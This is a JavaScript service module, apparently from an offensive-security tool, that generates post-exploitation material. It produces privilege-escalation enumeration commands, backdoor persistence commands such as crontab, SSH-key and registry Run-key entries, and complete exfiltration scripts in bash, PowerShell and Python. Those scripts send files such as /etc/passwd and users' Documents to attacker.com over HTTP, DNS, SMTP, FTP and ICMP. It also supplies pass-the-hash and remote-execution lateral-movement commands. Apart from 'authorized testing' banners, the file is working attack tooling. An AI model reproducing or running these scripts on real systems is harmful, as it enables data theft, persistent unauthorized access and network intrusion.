import { logger } from '../config/logger.js';
import { AppError } from '../middleware/errorHandler.js';

export class PostExploitationService {
  async privilegeEscalation(platform, method = 'auto') {
    try {
      logger.info(`Generating privilege escalation for ${platform}`);
      
      const techniques = {
        linux: [
          {
            name: 'SUID Binary Exploitation',
            command: 'find / -perm -u=s -type f 2>/dev/null',
            description: 'Find SUID binaries that can be exploited',
            difficulty: 'MEDIUM'
          },
          {
            name: 'Kernel Exploit',
            command: 'uname -r && cat /etc/issue',
            description: 'Check kernel version for known exploits',
            difficulty: 'HIGH'
          },
          {
            name: 'Sudo Misconfiguration',
            command: 'sudo -l',
            description: 'Check for sudo privileges',
            difficulty: 'LOW'
          },
          {
            name: 'Cron Jobs',
            command: 'cat /etc/crontab && ls -la /etc/cron.*',
            description: 'Check for writable cron jobs',
            difficulty: 'MEDIUM'
          }
        ],
        windows: [
          {
            name: 'UAC Bypass',
            command: 'whoami /priv',
            description: 'Check current privileges for UAC bypass',
            difficulty: 'MEDIUM'
          },
          {
            name: 'Token Impersonation',
            command: 'whoami /all',
            description: 'Check available tokens for impersonation',
            difficulty: 'HIGH'
          },
          {
            name: 'Unquoted Service Path',
            command: 'wmic service get name,displayname,pathname,startmode',
            description: 'Find services with unquoted paths',
            difficulty: 'MEDIUM'
          },
          {
            name: 'AlwaysInstallElevated',
            command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer',
            description: 'Check for AlwaysInstallElevated policy',
            difficulty: 'LOW'
          }
        ]
      };

      return {
        platform,
        method,
        techniques: techniques[platform.toLowerCase()] || [],
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY'
      };
    } catch (error) {
      logger.error(`Privilege escalation failed: ${error.message}`);
      throw new AppError(`Privilege escalation failed: ${error.message}`, 500);
    }
  }

  async persistenceTechniques(platform) {
    try {
      logger.info(`Generating persistence techniques for ${platform}`);
      
      const techniques = {
        linux: [
          {
            name: 'Cron Job',
            command: '(crontab -l ; echo "@reboot /tmp/backdoor.sh")| crontab -',
            description: 'Add backdoor to crontab',
            stealth: 'MEDIUM'
          },
          {
            name: 'SSH Key',
            command: 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys',
            description: 'Add SSH public key',
            stealth: 'HIGH'
          },
          {
            name: 'Systemd Service',
            command: 'Create malicious systemd service',
            description: 'Create persistent systemd service',
            stealth: 'LOW'
          }
        ],
        windows: [
          {
            name: 'Registry Run Key',
            command: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe',
            description: 'Add backdoor to registry run key',
            stealth: 'LOW'
          },
          {
            name: 'Scheduled Task',
            command: 'schtasks /create /tn "UpdateTask" /tr C:\\backdoor.exe /sc onlogon',
            description: 'Create scheduled task for persistence',
            stealth: 'MEDIUM'
          },
          {
            name: 'WMI Event Subscription',
            command: 'Create WMI event subscription',
            description: 'Use WMI for stealthy persistence',
            stealth: 'HIGH'
          }
        ]
      };

      return {
        platform,
        techniques: techniques[platform.toLowerCase()] || [],
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY'
      };
    } catch (error) {
      logger.error(`Persistence techniques failed: ${error.message}`);
      throw new AppError(`Persistence techniques failed: ${error.message}`, 500);
    }
  }

  buildHTTPExfiltrationScript(options = {}) {
    const server = options.server || 'http://attacker.com:8080';
    const dataPath = options.dataPath || '/tmp/sensitive_data.txt';
    const chunkSize = options.chunkSize || 1048576; // 1MB chunks
    
    return `#!/bin/bash
# HTTP Data Exfiltration Script
# Generated: ${new Date().toISOString()}
# Target Server: ${server}
# WARNING: FOR AUTHORIZED TESTING ONLY

SERVER="${server}"
DATA_PATH="${dataPath}"
CHUNK_SIZE=${chunkSize}
SESSION_ID=$(uname -n)-$(date +%s)

echo "[+] Starting HTTP exfiltration..."
echo "[+] Target: $DATA_PATH"
echo "[+] Server: $SERVER"
echo "[+] Session: $SESSION_ID"

# Function to exfiltrate file
exfiltrate_file() {
    local file="$1"
    local filename=$(basename "$file")
    
    if [ ! -f "$file" ]; then
        echo "[-] File not found: $file"
        return 1
    fi
    
    local filesize=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    echo "[+] File size: $filesize bytes"
    
    # Split into chunks if large
    if [ $filesize -gt $CHUNK_SIZE ]; then
        echo "[+] Splitting into chunks..."
        local chunks=$(($filesize / $CHUNK_SIZE + 1))
        
        for i in $(seq 0 $(($chunks - 1))); do
            local offset=$(($i * $CHUNK_SIZE))
            echo "[+] Sending chunk $((i+1))/$chunks..."
            
            dd if="$file" bs=$CHUNK_SIZE skip=$i count=1 2>/dev/null | \\
            base64 | \\
            curl -X POST \\
                -H "Content-Type: application/json" \\
                -H "X-Session-ID: $SESSION_ID" \\
                -H "X-Filename: $filename" \\
                -H "X-Chunk: $i" \\
                -H "X-Total-Chunks: $chunks" \\
                -d @- \\
                "$SERVER/upload" \\
                -s -o /dev/null
            
            if [ $? -eq 0 ]; then
                echo "[+] Chunk $((i+1)) sent successfully"
            else
                echo "[-] Failed to send chunk $((i+1))"
            fi
        done
    else
        # Send entire file
        echo "[+] Sending file..."
        base64 "$file" | \\
        curl -X POST \\
            -H "Content-Type: application/json" \\
            -H "X-Session-ID: $SESSION_ID" \\
            -H "X-Filename: $filename" \\
            -d @- \\
            "$SERVER/upload" \\
            -s -o /dev/null
        
        if [ $? -eq 0 ]; then
            echo "[+] File sent successfully"
        else
            echo "[-] Failed to send file"
        fi
    fi
}

# Function to exfiltrate directory
exfiltrate_directory() {
    local dir="$1"
    
    if [ ! -d "$dir" ]; then
        echo "[-] Directory not found: $dir"
        return 1
    fi
    
    echo "[+] Creating archive..."
    local archive="/tmp/exfil_$(date +%s).tar.gz"
    tar czf "$archive" -C "$(dirname "$dir")" "$(basename "$dir")" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] Archive created: $archive"
        exfiltrate_file "$archive"
        rm -f "$archive"
    else
        echo "[-] Failed to create archive"
    fi
}

# Main execution
if [ -f "$DATA_PATH" ]; then
    exfiltrate_file "$DATA_PATH"
elif [ -d "$DATA_PATH" ]; then
    exfiltrate_directory "$DATA_PATH"
else
    echo "[-] Path not found: $DATA_PATH"
    exit 1
fi

echo "[+] Exfiltration complete"`;
  }

  buildDNSExfiltrationScript(options = {}) {
    const domain = options.domain || 'attacker.com';
    const dataPath = options.dataPath || '/etc/passwd';
    
    return `#!/bin/bash
# DNS Tunneling Exfiltration Script
# Generated: ${new Date().toISOString()}
# Target Domain: ${domain}
# WARNING: FOR AUTHORIZED TESTING ONLY

DOMAIN="${domain}"
DATA_PATH="${dataPath}"
CHUNK_SIZE=63  # Max DNS label length

echo "[+] Starting DNS exfiltration..."
echo "[+] Data: $DATA_PATH"
echo "[+] Domain: $DOMAIN"

# Function to exfiltrate via DNS
dns_exfil() {
    local data="$1"
    local session_id=$(echo $RANDOM | md5sum | cut -c1-8)
    
    # Base64 encode and split into DNS-safe chunks
    local encoded=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local total_length=\${#encoded}
    local chunks=$(( ($total_length + $CHUNK_SIZE - 1) / $CHUNK_SIZE ))
    
    echo "[+] Total chunks: $chunks"
    
    # Send start marker
    dig "start.$session_id.$DOMAIN" +short > /dev/null 2>&1
    sleep 0.5
    
    # Send data chunks
    local pos=0
    local chunk_num=0
    while [ $pos -lt $total_length ]; do
        local chunk=\${encoded:$pos:$CHUNK_SIZE}
        local query="$chunk_num.$chunk.$session_id.$DOMAIN"
        
        echo "[+] Sending chunk $chunk_num..."
        dig "$query" +short > /dev/null 2>&1
        
        pos=$((pos + $CHUNK_SIZE))
        chunk_num=$((chunk_num + 1))
        sleep 0.2  # Rate limiting
    done
    
    # Send end marker
    dig "end.$chunks.$session_id.$DOMAIN" +short > /dev/null 2>&1
    echo "[+] Transmission complete"
}

# Read and exfiltrate data
if [ -f "$DATA_PATH" ]; then
    echo "[+] Reading file..."
    
    # Split large files
    if [ $(stat -f%z "$DATA_PATH" 2>/dev/null || stat -c%s "$DATA_PATH" 2>/dev/null) -gt 10240 ]; then
        echo "[+] Large file detected, splitting..."
        local line_num=0
        while IFS= read -r line; do
            dns_exfil "$line"
            line_num=$((line_num + 1))
            [ $((line_num % 10)) -eq 0 ] && echo "[+] Processed $line_num lines"
        done < "$DATA_PATH"
    else
        # Send entire file
        local data=$(cat "$DATA_PATH")
        dns_exfil "$data"
    fi
    
    echo "[+] Exfiltration complete"
else
    echo "[-] File not found: $DATA_PATH"
    exit 1
fi`;
  }

  buildPowerShellExfiltrationScript(options = {}) {
    const server = options.server || 'http://attacker.com:8080';
    const dataPath = options.dataPath || 'C:\\Users\\*\\Documents\\*.docx';
    
    return `# PowerShell Data Exfiltration Script
# Generated: ${new Date().toISOString()}
# Target Server: ${server}
# WARNING: FOR AUTHORIZED TESTING ONLY

$server = "${server}"
$dataPath = "${dataPath}"
$sessionId = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

Write-Host "[+] Starting PowerShell exfiltration..."
Write-Host "[+] Target: $dataPath"
Write-Host "[+] Server: $server"
Write-Host "[+] Session: $sessionId"

# Function to exfiltrate file
function Exfiltrate-File {
    param(
        [string]$FilePath,
        [string]$Server,
        [string]$SessionId
    )
    
    try {
        if (!(Test-Path $FilePath)) {
            Write-Host "[-] File not found: $FilePath"
            return $false
        }
        
        $fileName = Split-Path $FilePath -Leaf
        $fileSize = (Get-Item $FilePath).Length
        Write-Host "[+] File: $fileName ($fileSize bytes)"
        
        # Read file as base64
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
        
        # Create metadata
        $metadata = @{
            sessionId = $SessionId
            fileName = $fileName
            fileSize = $fileSize
            computerName = $env:COMPUTERNAME
            userName = $env:USERNAME
            timestamp = (Get-Date).ToString('o')
            data = $fileBase64
        } | ConvertTo-Json
        
        # Send to server
        $headers = @{
            "Content-Type" = "application/json"
            "X-Session-ID" = $SessionId
        }
        
        $response = Invoke-RestMethod -Uri "$Server/upload" \\
            -Method Post \\
            -Headers $headers \\
            -Body $metadata \\
            -UseBasicParsing \\
            -TimeoutSec 30
        
        Write-Host "[+] File uploaded successfully"
        return $true
        
    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
        return $false
    }
}

# Function to exfiltrate multiple files
function Exfiltrate-Files {
    param(
        [string]$Pattern,
        [string]$Server,
        [string]$SessionId
    )
    
    try {
        $files = Get-ChildItem -Path $Pattern -Recurse -File -ErrorAction SilentlyContinue
        $totalFiles = $files.Count
        $successCount = 0
        
        Write-Host "[+] Found $totalFiles files matching pattern"
        
        foreach ($file in $files) {
            Write-Host "[+] Processing: $($file.FullName)"
            
            if (Exfiltrate-File -FilePath $file.FullName -Server $Server -SessionId $SessionId) {
                $successCount++
            }
            
            # Rate limiting
            Start-Sleep -Milliseconds 500
        }
        
        Write-Host "[+] Exfiltrated $successCount / $totalFiles files"
        
    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
    }
}

# Function to exfiltrate system information
function Exfiltrate-SystemInfo {
    param(
        [string]$Server,
        [string]$SessionId
    )
    
    try {
        Write-Host "[+] Collecting system information..."
        
        $systemInfo = @{
            sessionId = $SessionId
            computerName = $env:COMPUTERNAME
            userName = $env:USERNAME
            domain = $env:USERDOMAIN
            osVersion = (Get-WmiObject Win32_OperatingSystem).Caption
            architecture = $env:PROCESSOR_ARCHITECTURE
            ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress
            installedSoftware = (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | Where-Object {$_.DisplayName -ne $null}).DisplayName
            timestamp = (Get-Date).ToString('o')
        } | ConvertTo-Json -Depth 3
        
        $headers = @{
            "Content-Type" = "application/json"
            "X-Session-ID" = $SessionId
            "X-Data-Type" = "SystemInfo"
        }
        
        Invoke-RestMethod -Uri "$Server/sysinfo" \\
            -Method Post \\
            -Headers $headers \\
            -Body $systemInfo \\
            -UseBasicParsing \\
            -TimeoutSec 30
        
        Write-Host "[+] System information sent"
        
    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
    }
}

# Main execution
try {
    # Exfiltrate system info first
    Exfiltrate-SystemInfo -Server $server -SessionId $sessionId
    
    # Exfiltrate files matching pattern
    Exfiltrate-Files -Pattern $dataPath -Server $server -SessionId $sessionId
    
    Write-Host "[+] Exfiltration complete"
    
} catch {
    Write-Host "[-] Fatal error: $($_.Exception.Message)"
    exit 1
}`;
  }

  buildSMTPExfiltrationScript(options = {}) {
    const smtpServer = options.smtpServer || 'smtp.gmail.com';
    const smtpPort = options.smtpPort || 587;
    const from = options.from || 'exfil@example.com';
    const to = options.to || 'attacker@example.com';
    const dataPath = options.dataPath || '/tmp/data.txt';
    
    return `#!/usr/bin/env python3
# SMTP Email Exfiltration Script
# Generated: ${new Date().toISOString()}
# SMTP Server: ${smtpServer}:${smtpPort}
# WARNING: FOR AUTHORIZED TESTING ONLY

import smtplib
import base64
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# Configuration
SMTP_SERVER = "${smtpServer}"
SMTP_PORT = ${smtpPort}
FROM_EMAIL = "${from}"
TO_EMAIL = "${to}"
DATA_PATH = "${dataPath}"
SMTP_USER = "${options.smtpUser || 'user@example.com'}"
SMTP_PASS = "${options.smtpPass || 'password'}"

def exfiltrate_via_email(file_path):
    """Exfiltrate data via email"""
    try:
        print(f"[+] Reading file: {file_path}")
        
        # Create message
        msg = MIMEMultipart()
        msg['From'] = FROM_EMAIL
        msg['To'] = TO_EMAIL
        msg['Subject'] = f"Data Exfil - {os.path.basename(file_path)} - {datetime.now().strftime('%Y%m%d-%H%M%S')}"
        
        # Add body
        body = f"""
        Exfiltrated Data Report
        -----------------------
        Filename: {os.path.basename(file_path)}
        Size: {os.path.getsize(file_path)} bytes
        Timestamp: {datetime.now().isoformat()}
        Hostname: {os.uname().nodename}
        """
        msg.attach(MIMEText(body, 'plain'))
        
        # Attach file
        with open(file_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
            msg.attach(part)
        
        # Send email
        print(f"[+] Connecting to {SMTP_SERVER}:{SMTP_PORT}...")
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        
        print(f"[+] Authenticating...")
        server.login(SMTP_USER, SMTP_PASS)
        
        print(f"[+] Sending email...")
        server.send_message(msg)
        server.quit()
        
        print(f"[+] Data exfiltrated successfully via email")
        return True
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    if os.path.exists(DATA_PATH):
        exfiltrate_via_email(DATA_PATH)
    else:
        print(f"[-] File not found: {DATA_PATH}")`;
  }

  async dataExfiltration(method = 'http', options = {}) {
    try {
      logger.info(`Generating data exfiltration script for ${method}`);
      
      let script;
      let format;
      let name;
      let description;
      
      switch(method.toLowerCase()) {
        case 'http':
        case 'https':
          script = this.buildHTTPExfiltrationScript(options);
          format = 'bash';
          name = 'HTTP POST Exfiltration';
          description = 'Exfiltrate data via HTTP POST with chunking support';
          break;
          
        case 'dns':
          script = this.buildDNSExfiltrationScript(options);
          format = 'bash';
          name = 'DNS Tunneling Exfiltration';
          description = 'Exfiltrate data via DNS queries (stealth method)';
          break;
          
        case 'powershell':
          script = this.buildPowerShellExfiltrationScript(options);
          format = 'powershell';
          name = 'PowerShell HTTP Exfiltration';
          description = 'Exfiltrate files via PowerShell with metadata';
          break;
          
        case 'smtp':
        case 'email':
          script = this.buildSMTPExfiltrationScript(options);
          format = 'python';
          name = 'SMTP Email Exfiltration';
          description = 'Exfiltrate data via email attachments';
          break;
          
        case 'ftp':
          script = `#!/bin/bash
# FTP Exfiltration Script
# Generated: ${new Date().toISOString()}

FTP_SERVER="${options.ftpServer || 'ftp.attacker.com'}"
FTP_USER="${options.ftpUser || 'anonymous'}"
FTP_PASS="${options.ftpPass || 'guest'}"
DATA_PATH="${options.dataPath || '/tmp/data.txt'}"

echo "[+] Starting FTP exfiltration..."
ftp -n $FTP_SERVER <<EOF
user $FTP_USER $FTP_PASS
binary
put $DATA_PATH
bye
EOF
echo "[+] Upload complete"`;
          format = 'bash';
          name = 'FTP Upload Exfiltration';
          description = 'Exfiltrate data via FTP upload';
          break;
          
        case 'icmp':
          script = `#!/bin/bash
# ICMP Tunneling Exfiltration
# Generated: ${new Date().toISOString()}
# Requires: hping3

TARGET="${options.target || 'attacker.com'}"
DATA_PATH="${options.dataPath || '/etc/passwd'}"

echo "[+] ICMP exfiltration to $TARGET"
hping3 -1 -d 1400 -E "$DATA_PATH" "$TARGET"`;
          format = 'bash';
          name = 'ICMP Tunneling';
          description = 'Exfiltrate data via ICMP packets';
          break;
          
        default:
          script = this.buildHTTPExfiltrationScript(options);
          format = 'bash';
          name = 'HTTP POST Exfiltration';
          description = 'Exfiltrate data via HTTP POST with chunking support';
      }

      return {
        method,
        name,
        description,
        script,
        format,
        options,
        usage: format === 'bash' ? 
          `Save as exfil.sh and execute:\n  chmod +x exfil.sh\n  ./exfil.sh` :
        format === 'powershell' ?
          `Save as exfil.ps1 and execute:\n  powershell -ExecutionPolicy Bypass -File exfil.ps1` :
          `Save as exfil.py and execute:\n  python3 exfil.py`,
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY. Unauthorized data exfiltration is illegal.'
      };
    } catch (error) {
      logger.error(`Data exfiltration failed: ${error.message}`);
      throw new AppError(`Data exfiltration failed: ${error.message}`, 500);
    }
  }

  async lateralMovement(network, technique = 'pass-the-hash') {
    try {
      logger.info(`Generating lateral movement techniques for ${network}`);
      
      const techniques = {
        'pass-the-hash': {
          name: 'Pass-the-Hash',
          tools: ['Mimikatz', 'CrackMapExec', 'Impacket'],
          command: 'crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLMHASH',
          description: 'Use NTLM hash to authenticate to other systems'
        },
        'psexec': {
          name: 'PsExec',
          tools: ['PsExec', 'Impacket'],
          command: 'psexec.py domain/user:password@target',
          description: 'Execute commands on remote system'
        },
        'wmi': {
          name: 'WMI Execution',
          tools: ['wmiexec', 'CrackMapExec'],
          command: 'wmiexec.py domain/user:password@target',
          description: 'Execute commands via WMI'
        },
        'ssh': {
          name: 'SSH Key Reuse',
          tools: ['ssh'],
          command: 'ssh -i stolen_key user@target',
          description: 'Reuse stolen SSH keys'
        }
      };

      return {
        network,
        technique: techniques[technique] || techniques['pass-the-hash'],
        allTechniques: Object.keys(techniques),
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY'
      };
    } catch (error) {
      logger.error(`Lateral movement failed: ${error.message}`);
      throw new AppError(`Lateral movement failed: ${error.message}`, 500);
    }
  }
}

export default new PostExploitationService();
